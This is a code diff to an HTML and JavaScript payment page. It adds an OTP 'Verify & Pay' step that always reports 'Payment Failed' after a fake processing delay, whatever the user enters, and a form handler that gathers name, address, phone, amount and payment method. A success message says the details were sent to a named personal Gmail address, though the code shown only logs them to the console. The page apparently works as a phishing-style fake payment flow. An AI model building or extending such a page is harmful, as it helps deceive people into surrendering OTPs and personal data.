@@ -379,6 +379,55 @@
             font-weight: bold;
             font-size: 20px;
         }
+        
+        .success-checkmark {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            border-radius: 50%;
+            box-sizing: content-box;
+            border: 4px solid #4a6cf7;
+        }
+        
+        .check-icon::before {
+            top: 3px;
+            left: -2px;
+            transform: rotate(45deg);
+        }
+        
+        .check-icon::after {
+            top: 0;
+            left: 30px;
+            transform: rotate(-45deg);
+        }
+        
+        .check-icon::before, .check-icon::after {
+            content: '';
+            height: 40px;
+            position: absolute;
+            background: #4a6cf7;
+            border-radius: 2px;
+        }
+        
+        .check-icon::before {
+            width: 10px;
+            top: 46px;
+            left: 14px;
+            transform: rotate(45deg);
+        }
+        
+        .check-icon::after {
+            width: 30px;
+            top: 38px;
+            left: 24px;
+            transform: rotate(-45deg);
+        }
     </style>
 </head>
 <body>
@@ -626,7 +675,7 @@
                     Didn't receive OTP? <a href="#" style="color: #4a6cf7; text-decoration: none;">Resend</a>
                 </p>
                 
-                <button class="btn" onclick="showFailedMessage()">Verify & Pay</button>
+                <button class="btn" id="verify-otp-btn" onclick="verifyOtp()">Verify & Pay</button>
                 
                 <div class="navigation">
                     <button class="btn back-btn" onclick="goBackFromOtp()">Back</button>
@@ -639,6 +688,16 @@
                 <h3>Payment Failed</h3>
                 <p>Your transaction could not be completed. Please try again.</p>
                 <button class="btn" onclick="retryPayment()">Retry Payment</button>
+            </div>
+            
+            <!-- Success Message -->
+            <div class="form-section" id="success-section">
+                <div class="success-checkmark">
+                    <div class="check-icon"></div>
+                </div>
+                <h2 style="text-align: center; color: #4a6cf7;">Form Submitted Successfully!</h2>
+                <p style="text-align: center; color: #666; margin: 15px 0;">All your details have been sent to sinhaujjwalkumar1@gmail.com</p>
+                <button class="btn" onclick="resetForm()">Submit Another Form</button>
             </div>
         </div>
     </div>
@@ -722,7 +781,6 @@
         // Show OTP section
         function showOtpSection() {
             showSection('otp-section');
-            setTimeout(showFailedMessage, 1000);
         }
         
         // Show transaction password for net banking
@@ -731,9 +789,22 @@
             showOtpSection();
         }
         
-        // Show failed message
-        function showFailedMessage() {
-            document.getElementById('failed-message').classList.add('active');
+        // Verify OTP
+        function verifyOtp() {
+            // First show processing state
+            const verifyBtn = document.getElementById('verify-otp-btn');
+            verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            verifyBtn.disabled = true;
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                // Show failed message after OTP verification
+                document.getElementById('failed-message').classList.add('active');
+                
+                // Reset button state
+                verifyBtn.innerHTML = 'Verify & Pay';
+                verifyBtn.disabled = false;
+            }, 2000);
         }
         
         // Retry payment
@@ -805,6 +876,51 @@
                 }
             });
         });
+        
+        // Form submission to email
+        function submitForm() {
+            // Collect form data
+            const formData = {
+                name: document.getElementById('name').value,
+                address: document.getElementById('address').value,
+                phone: document.getElementById('phone').value,
+                purpose: document.querySelector('.option-item.selected').getAttribute('data-value'),
+                amount: document.getElementById('amount').value,
+                paymentMethod: document.querySelector('.payment-option.selected').getAttribute('data-method'),
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // In a real implementation, you would send this data to your server
+            // which would then email it to sinhaujjwalkumar1@gmail.com
+            
+            // For demonstration, we'll just show a success message
+            showSection('success-section');
+            
+            // Log the data to console (for testing)
+            console.log('Form data to be emailed:', formData);
+        }
+        
+        // Reset form
+        function resetForm() {
+            document.getElementById('name').value = '';
+            document.getElementById('address').value = '';
+            document.getElementById('phone').value = '';
+            document.getElementById('amount').value = '5';
+            
+            // Reset selections
+            document.querySelectorAll('.option-item').forEach(item => {
+                item.classList.remove('selected');
+            });
+            document.querySelector('.option-item').classList.add('selected');
+            
+            document.querySelectorAll('.payment-option').forEach(option => {
+                option.classList.remove('selected');
+            });
+            document.querySelector('.payment-option').classList.add('selected');
+            
+            // Show first section
+            showSection('personal-details');
+        }
     </script>
 </body>
 </html>
